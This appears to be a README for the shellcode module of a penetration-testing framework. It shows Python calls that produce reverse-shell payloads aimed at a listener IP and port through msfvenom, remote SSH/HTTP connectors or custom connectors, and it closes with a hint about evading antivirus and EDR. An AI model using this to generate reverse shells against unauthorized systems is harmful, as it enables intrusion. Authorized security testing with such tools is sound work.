# Shellcode Generation

Generate shellcode using multiple methods: local tools (msfvenom), remote machines (SSH/HTTP), or custom connectors.

## Directory Structure

```
shellcode/
├── connectors/          # Connector implementations
│   ├── msfvenom.py      # Built-in: msfvenom wrapper
│   ├── remote.py        # Built-in: SSH/HTTP execution
│   ├── your_*.py        # Your custom connectors (auto-discovered)
│   └── README.md        # Connector development guide
├── linux/               # Legacy assembly sources
└── windows/             # Legacy assembly sources
```

## Quick Usage

### Basic (Auto-select)

```python
from ofx.api.shellcode import OSShellcodes

sc = OSShellcodes("linux", "x64", "192.168.1.100", 4444)
payload = sc.create_shellcode(shellcode_type="reverse")  # Uses msfvenom if available
```

### Specific Connector

```python
# Use msfvenom explicitly
payload = sc.create_shellcode(shellcode_type="reverse", connector_name="msfvenom")
```

### Remote Execution

**SSH:**
```python
from ofx.api.shellcode.connectors import get_registry
from ofx.data.shellcode.connectors.remote import RemoteSSHConnector

ssh = RemoteSSHConnector(host='kali.local', user='root', identity_file='~/.ssh/id_rsa')
get_registry().register_connector_instance(ssh)

payload = sc.create_shellcode(connector_name=f"remote-ssh-{ssh.host}")
```

**HTTP API:**
```python
from ofx.data.shellcode.connectors.remote import RemoteHTTPConnector

http = RemoteHTTPConnector(base_url='https://api.example.com', api_key='key')
get_registry().register_connector_instance(http)

payload = sc.create_shellcode(connector_name=http.name)
```

## Extending

### Create Custom Connector

1. **Create file:** `connectors/my_tool.py`
2. **Implement:**
```python
from ofx.data.shellcode.connectors.base import ShellcodeConnector
import subprocess

class MyToolConnector(ShellcodeConnector):
    def __init__(self):
        super().__init__(name="mytool", description="My tool")
    
    def generate(self, os_target, arch, shell_type, ip, port, **kwargs):
        cmd = ['mytool', '--os', os_target, '--ip', ip, '--port', str(port)]
        result = subprocess.run(cmd, capture_output=True, check=True)
        return result.stdout
    
    def _check_availability(self):
        return shutil.which('mytool') is not None
```

3. **Use:**
```python
from ofx.api.shellcode import OSShellcodes

# Auto-discovered
sc = OSShellcodes("linux", "x64", "192.168.1.100", 4444)
payload = sc.create_shellcode(connector_name="mytool")
```

See [connectors/README.md](connectors/README.md) for detailed guide.

## Troubleshooting

## Troubleshooting

**Msfvenom not found:**
```bash
# Install Metasploit
curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall
chmod 755 msfinstall && ./msfinstall
```

**Connector not available:**
- Check logs for dependency issues
- Verify tool is installed (e.g., `which msfvenom`)
- For remote connectors, verify SSH keys or API credentials

**Assembly compilation fails:**
- Verify NASM syntax in `.asm` files
- Check Docker is installed and running
- See legacy assembly sources in `linux/` and `windows/` directories

## Resources

- **Metasploit msfvenom**: https://docs.metasploit.com/docs/using-metasploit/basics/how-to-use-msfvenom.html
- **NASM Documentation**: https://nasm.us/docs.php
- **x86/x64 Reference**: https://www.felixcloutier.com/x86/
- **Linux Syscalls**: https://syscalls.kernelgrok.com/

---

⚠️ **Security Warning:** Only use in authorized testing environments. Generated shellcode may be detected by AV/EDR. Consider encoding, encryption, or polymorphic techniques for evasion.
